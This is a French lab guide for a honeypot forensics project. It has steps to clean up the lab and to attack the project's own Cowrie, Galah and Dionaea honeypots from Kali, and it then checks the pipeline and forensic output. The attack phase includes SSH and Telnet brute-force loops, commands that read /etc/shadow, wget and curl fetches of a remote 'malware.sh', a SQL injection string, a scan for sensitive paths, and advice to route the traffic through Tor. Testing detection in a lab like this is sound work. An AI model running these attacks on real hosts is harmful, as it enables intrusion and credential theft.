# ForenHive — Guide de Simulation Complète (Sprints 1, 2, 3)
**Attaque des honeypots depuis une adresse publique · Résultats propres**
*Serveur: 172.16.1.100 | Machine attaquante: Kali Linux*

---

## Vue d'ensemble

Ce guide simule un cycle d'attaque complet :

```
Phase 0 : Nettoyage (logs + ES + PostgreSQL)
Phase 1 : Attaques réalistes sur les 3 honeypots    ← Sprint 1
Phase 2 : Vérification pipeline ETL                 ← Sprint 2
Phase 3 : Analyse forensique + résultats            ← Sprint 3
```

**Adresse publique :** Pour obtenir des résultats d'enrichissement (AbuseIPDB, Shodan, GeoIP),
les attaques doivent provenir d'une IP publique. Deux options :

| Option | Commande Kali | IP vue par honeypot |
|---|---|---|
| **VPN (recommandé)** | Activer ProtonVPN / Mullvad / OpenVPN sur Kali avant les attaques | IP du serveur VPN (publique, connue dans AbuseIPDB si VPN partagé) |
| **Tor** | `sudo systemctl start tor` puis préfixer les commandes avec `proxychains4` | IP du nœud de sortie Tor (haute réputation AbuseIPDB) |
| **Kali directe** | Rien à faire | IP privée 172.x.x.x (enrichissement sauté, scores faibles) |

> Pour la démo PFE, l'option **Tor** donne les meilleurs résultats forensiques car les IPs
> de sortie Tor ont des scores AbuseIPDB élevés et `is_tor: true`.

---

## Phase 0 — Nettoyage complet

> Toutes les commandes suivantes sont sur le **serveur** (172.16.1.100).

### 0.1 — Supprimer les indices Elasticsearch

```bash
# Sur le serveur — ES bloque les wildcards sur DELETE, supprimer un par un
docker exec forenhive-elasticsearch curl -s "http://localhost:9200/_cat/indices/honeypot-logs-*?h=index" | \
  while read idx; do
    echo -n "Suppression $idx ... "
    docker exec forenhive-elasticsearch curl -s -X DELETE "http://localhost:9200/$idx" | \
      python3 -c "import sys,json; d=json.load(sys.stdin); print('OK' if d.get('acknowledged') else d)"
  done
```
**Résultat attendu :** `Suppression honeypot-logs-YYYY.MM.dd ... OK` pour chaque index

Vérifier :
```bash
docker exec forenhive-elasticsearch curl -s "http://localhost:9200/_cat/indices/honeypot-logs-*?v"
```
**Résultat attendu :** vide (aucun index)

---

### 0.2 — Vider les tables PostgreSQL

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
TRUNCATE ip_enrichment_cache, file_analysis, forensic_sessions, suspect_profiles;
"
```
**Résultat attendu :** `TRUNCATE TABLE`

---

### 0.3 — Vider les logs des honeypots

**Cowrie :**
```bash
docker run --rm \
  -v bb474ddc3d2a3f3026c85d4c2fe7f1c5723f2e68f8ba60a05e4c9bb4471292ce:/data \
  alpine sh -c "truncate -s 0 /data/log/cowrie/cowrie.json"
```

**Galah :**
```bash
docker exec forenhive-galah sh -c "truncate -s 0 /app/event_log.json"
```

**Dionaea :** (redémarrage = log vidé)
```bash
docker compose restart dionaea
```

---

### 0.4 — Réinitialiser le registre Filebeat

Filebeat garde la position de lecture de chaque fichier. Il faut réinitialiser ce registre sinon il ignore les nouveaux contenus des fichiers tronqués.

```bash
docker compose stop filebeat

docker run --rm \
  -v forenhive_filebeat-registry:/registry \
  alpine sh -c "rm -rf /registry/* 2>/dev/null; echo 'Registry cleared'"

docker compose start filebeat
```

Vérifier que Filebeat est bien reparti :
```bash
sleep 5
docker logs forenhive-filebeat --tail=10 2>&1 | grep -v "^{"
```
**Résultat attendu :** lignes `Harvester started` pour cowrie / dionaea / galah / zeek

---

### 0.5 — Vérifier que tout est propre

```bash
# ES : 0 documents
docker exec forenhive-elasticsearch curl -s "http://localhost:9200/_cat/indices/honeypot-logs-*?v"

# PostgreSQL : 0 lignes
docker exec forenhive-postgresql psql -U forenhive -d forenhive \
  -c "SELECT (SELECT count(*) FROM ip_enrichment_cache) AS cache,
             (SELECT count(*) FROM forensic_sessions) AS sessions,
             (SELECT count(*) FROM file_analysis) AS files;"

# Cowrie : log vide
docker run --rm \
  -v bb474ddc3d2a3f3026c85d4c2fe7f1c5723f2e68f8ba60a05e4c9bb4471292ce:/data \
  alpine wc -l /data/log/cowrie/cowrie.json
```

---

## Phase 1 — Attaques sur les honeypots

> Toutes les commandes suivantes sont sur la **machine Kali**.
> Si Tor : démarrer `sudo systemctl start tor` avant de commencer.

### 1.1 — Cowrie SSH (port 2222)

#### Brute force SSH — mots de passe incorrects
```bash
# Kali — tentatives multiples avec mauvais mot de passe (génère cowrie.login.failed)
for i in $(seq 1 20); do
  sshpass -p "wrongpass$i" ssh -p 2222 \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=3 \
    root@172.16.1.100 2>/dev/null
  sleep 0.5
done
echo "Brute force terminé"
```

Avec Tor :
```bash
for i in $(seq 1 20); do
  proxychains4 -q sshpass -p "wrongpass$i" ssh -p 2222 \
    -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    root@172.16.1.100 2>/dev/null
  sleep 1
done
```

#### Connexion réussie + commandes post-exploitation
```bash
# Connexion avec credential valide (génère cowrie.login.success)
sshpass -p "root" ssh -p 2222 \
  -o StrictHostKeyChecking=no root@172.16.1.100 << 'COMMANDS'
whoami
id
uname -a
cat /etc/passwd
ls -la /root/
ls -la /var/
cat /etc/shadow 2>/dev/null
ps aux
netstat -an 2>/dev/null || ss -an
wget http://185.220.101.5/malware.sh -O /tmp/m.sh 2>/dev/null || true
curl http://185.220.101.5/payload -o /tmp/p 2>/dev/null || true
history
exit
COMMANDS
```

#### Brute force Telnet (port 2223)
```bash
for user in root admin ubuntu; do
  for pass in "password" "123456" "admin" "toor"; do
    (echo "$user"; sleep 1; echo "$pass"; sleep 2; echo "whoami"; sleep 1) | \
    nc -w 5 172.16.1.100 2223 2>/dev/null
    sleep 0.3
  done
done
echo "Telnet brute force terminé"
```

---

### 1.2 — Galah Web Honeypot (ports 8080 et 8888)

```bash
# Reconnaissance web (génère galah events avec uri, user-agent, method)
TARGET="http://172.16.1.100:8080"

# Scan de chemins suspects
for path in \
  "/" "/wp-admin/" "/wp-login.php" "/.env" "/config.php" \
  "/admin/" "/login" "/phpmyadmin/" "/shell.php" \
  "/api/v1/users" "/.git/config" "/backup.zip" \
  "/etc/passwd" "/../../../etc/passwd" \
  "/console" "/actuator/env" "/manager/html" \
  "/.well-known/security.txt" "/robots.txt" \
  "/xmlrpc.php" "/wp-config.php.bak"; do
  curl -s -o /dev/null -w "%{http_code} $path\n" \
    -A "Mozilla/5.0 zgrab/0.x" \
    "$TARGET$path"
  sleep 0.3
done

# POST avec credentials (injection SQL, formulaires)
curl -s -X POST "$TARGET/login" \
  -d "username=admin' OR 1=1--&password=test" \
  -A "sqlmap/1.7" -o /dev/null

curl -s -X POST "$TARGET/wp-login.php" \
  -d "log=admin&pwd=password&wp-submit=Login" \
  -o /dev/null

# Même chose sur port 8888
TARGET2="http://172.16.1.100:8888"
for path in "/admin" "/.env" "/api/users" "/debug"; do
  curl -s -o /dev/null "$TARGET2$path"
done

echo "Scan Galah terminé"
```

Avec Tor :
```bash
for path in "/" "/wp-admin/" "/.env" "/admin/" "/phpmyadmin/"; do
  proxychains4 -q curl -s -o /dev/null -w "%{http_code} $path\n" \
    "http://172.16.1.100:8080$path"
  sleep 1
done
```

---

### 1.3 — Dionaea Multi-protocoles

#### SMB (port 445)
```bash
# Enumération SMB — Dionaea se présente comme WIN-SERVER2019
smbclient -L //172.16.1.100 -N 2>/dev/null
smbclient //172.16.1.100/ADMIN$ -N 2>/dev/null
smbclient //172.16.1.100/C$ -N 2>/dev/null

# Nmap SMB scripts
nmap -p 445 --script smb-enum-shares,smb-os-discovery 172.16.1.100
```

#### MySQL (port 3306)
```bash
# Tentative de connexion MySQL
mysql -h 172.16.1.100 -u root -p"root" --connect-timeout=5 2>/dev/null || true
mysql -h 172.16.1.100 -u admin -p"admin" --connect-timeout=5 2>/dev/null || true
```

#### MongoDB (port 27017)
```bash
# Connexion MongoDB sans auth
mongo --host 172.16.1.100 --port 27017 --eval "db.adminCommand({listDatabases:1})" \
  --quiet 2>/dev/null || true
```

#### MSSQL (port 1433)
```bash
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password 172.16.1.100
```

#### Scan global Dionaea
```bash
nmap -sV -p 23,80,445,1433,1883,3306,27017 --open 172.16.1.100
```

---

### 1.4 — Vérifier que les honeypots ont capturé les événements

```bash
# Sur le serveur

# Cowrie — voir les derniers événements
docker run --rm \
  -v bb474ddc3d2a3f3026c85d4c2fe7f1c5723f2e68f8ba60a05e4c9bb4471292ce:/data \
  alpine sh -c "tail -5 /data/log/cowrie/cowrie.json" | \
  python3 -c "import sys; [print(__import__('json').loads(l).get('eventid','?'), l[:60]) for l in sys.stdin]"

# Galah — compter les événements capturés
docker exec forenhive-galah sh -c "wc -l /app/event_log.json"

# Dionaea — voir les dernières lignes
docker exec forenhive-dionaea tail -5 /opt/dionaea/var/log/dionaea/dionaea.log
```

---

## Phase 2 — Vérification Pipeline ETL (Sprint 2)

> Attendre ~30 secondes après les attaques pour laisser Filebeat → Logstash → ES traiter les événements.

```bash
sleep 30
```

### 2.1 — Vérifier Filebeat

```bash
docker logs forenhive-filebeat --tail=20 2>&1 | grep -v "^{"
```
**Résultat attendu :** lignes `Published events` sans erreur

### 2.2 — Vérifier Logstash

```bash
docker exec forenhive-logstash curl -s http://127.0.0.1:9600/_node/stats/pipelines | python3 -c "
import sys, json
d = json.load(sys.stdin)
p = d['pipelines']['main']['events']
print('Événements reçus  :', p['in'])
print('Événements envoyés:', p['out'])
"
```

### 2.3 — Vérifier Elasticsearch

```bash
TODAY=$(date +%Y.%m.%d)
docker exec forenhive-elasticsearch curl -s \
  "http://localhost:9200/honeypot-logs-$TODAY/_search?pretty" \
  -H 'Content-Type: application/json' \
  -d '{
    "size": 0,
    "aggs": {
      "par_honeypot": {
        "terms": {"field": "honeypot.type.keyword"}
      }
    }
  }' | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('Total:', d['hits']['total']['value'])
for b in d['aggregations']['par_honeypot']['buckets']:
    print(f'  {b[\"key\"]:12} : {b[\"doc_count\"]:,} events')
"
```
**Résultat attendu :** cowrie / galah / dionaea / zeek présents avec doc_count > 0

### 2.4 — Vérifier un événement Cowrie normalisé

```bash
TODAY=$(date +%Y.%m.%d)
docker exec forenhive-elasticsearch curl -s \
  "http://localhost:9200/honeypot-logs-$TODAY/_search" \
  -H 'Content-Type: application/json' \
  -d '{"size":1,"query":{"term":{"honeypot.type.keyword":"cowrie"}},
       "_source":["source.ip","user.name","user.password","event.id","@timestamp"]}' | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
if d['hits']['hits']:
    print(json.dumps(d['hits']['hits'][0]['_source'], indent=2))
"
```

---

## Phase 3 — Analyse Forensique (Sprint 3)

### 3.1 — Lancer l'analyse complète

```bash
docker compose run --rm forensic-engine python engine.py --hours 24
```

**Sortie attendue :**
```
[INFO] enricher — Found N unique source IPs in the last 24h
[INFO] enricher — Enriching X.X.X.X ...          ← IP publique (si Tor/VPN utilisé)
[INFO] yara_scanner — Scanning N Dionaea binary files ...
[INFO] virustotal — VirusTotal [hash...] N/72 detections
[INFO] engine — Found N Cowrie sessions to score
[INFO] engine — Risk breakdown : CRITICAL=? HIGH=? MEDIUM=?
```

### 3.2 — Extraire les résultats forensiques

#### Résumé des sessions

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT
  session_id,
  source_ip,
  risk_score,
  CASE
    WHEN risk_score >= 80 THEN 'CRITICAL'
    WHEN risk_score >= 60 THEN 'HIGH'
    WHEN risk_score >= 40 THEN 'MEDIUM'
    WHEN risk_score >= 20 THEN 'LOW'
    ELSE 'INFO'
  END AS level,
  started_at,
  ended_at
FROM forensic_sessions
ORDER BY risk_score DESC;
"
```

#### Enrichissement IP (si IP publique)

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT
  ip,
  data->'geo'->>'country'          AS country,
  data->'geo'->>'city'             AS city,
  data->'geo'->>'org'              AS org,
  data->'privacy'->>'is_tor'       AS is_tor,
  data->'privacy'->>'is_vpn'       AS is_vpn,
  data->'reputation'->>'abuse_score'    AS abuse,
  data->'reputation'->>'total_reports'  AS reports,
  data->'reputation'->>'isp'            AS isp
FROM ip_enrichment_cache;
"
```

#### Analyse de fichiers malveillants

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT
  sha256,
  virustotal_result->>'detection_ratio'  AS vt_ratio,
  virustotal_result->>'family'           AS family,
  virustotal_result->>'tags'             AS vt_tags,
  jsonb_array_length(yara_matches)       AS yara_hits,
  yara_matches->0->>'rule'               AS first_rule
FROM file_analysis
WHERE yara_matches IS NOT NULL AND jsonb_array_length(yara_matches) > 0;
"
```

#### Statistiques globales

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT
  (SELECT count(*) FROM forensic_sessions)                         AS sessions_totales,
  (SELECT count(DISTINCT source_ip) FROM forensic_sessions)        AS ips_uniques,
  (SELECT max(risk_score) FROM forensic_sessions)                  AS score_max,
  (SELECT round(avg(risk_score),1) FROM forensic_sessions)         AS score_moyen,
  (SELECT count(*) FROM ip_enrichment_cache)                       AS ips_enrichies,
  (SELECT count(*) FROM file_analysis WHERE jsonb_array_length(yara_matches) > 0) AS fichiers_malveillants,
  (SELECT count(*) FROM file_analysis WHERE virustotal_result->>'malicious' != '0') AS detectes_vt;
"
```

---

## Résultats attendus selon le type d'IP

### Avec adresse IP publique (Tor / VPN)

| Champ | Valeur typique |
|---|---|
| `is_tor` | `true` (si Tor) |
| `abuse_score` | 80–100 (nœuds de sortie Tor sont blacklistés) |
| `total_reports` | Centaines à milliers |
| `risk_score` session | 40–80 (MEDIUM à HIGH) |
| `country` | Allemagne / Pays-Bas / USA (selon nœud de sortie) |

### Avec adresse IP privée (Kali directe)

| Champ | Valeur |
|---|---|
| `enrichment` | `{"private": true}` (aucune API appelée) |
| `abuse_score` | 0 |
| `risk_score` session | 0–5 (INFO uniquement) |

---

## Récapitulatif des commandes clés

```bash
# 1 — Nettoyage
docker exec forenhive-elasticsearch curl -s -X DELETE "http://localhost:9200/honeypot-logs-*"
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "TRUNCATE ip_enrichment_cache, file_analysis, forensic_sessions, suspect_profiles;"
docker run --rm -v bb474ddc3d2a3f3026c85d4c2fe7f1c5723f2e68f8ba60a05e4c9bb4471292ce:/data alpine sh -c "truncate -s 0 /data/log/cowrie/cowrie.json"
docker exec forenhive-galah sh -c "truncate -s 0 /app/event_log.json"
docker compose restart dionaea filebeat

# 2 — Attaques (depuis Kali)
#   SSH brute force + login + commandes → port 2222
#   Web scan → ports 8080 / 8888
#   SMB + MySQL + MongoDB → ports 445 / 3306 / 27017

# 3 — Attendre pipeline
sleep 30

# 4 — Vérifier ES
docker exec forenhive-elasticsearch curl -s "http://localhost:9200/_cat/indices/honeypot-logs-*?v"

# 5 — Analyse forensique
docker compose run --rm forensic-engine python engine.py --hours 24

# 6 — Résultats
docker exec forenhive-postgresql psql -U forenhive -d forenhive \
  -c "SELECT session_id, source_ip, risk_score FROM forensic_sessions ORDER BY risk_score DESC;"
```
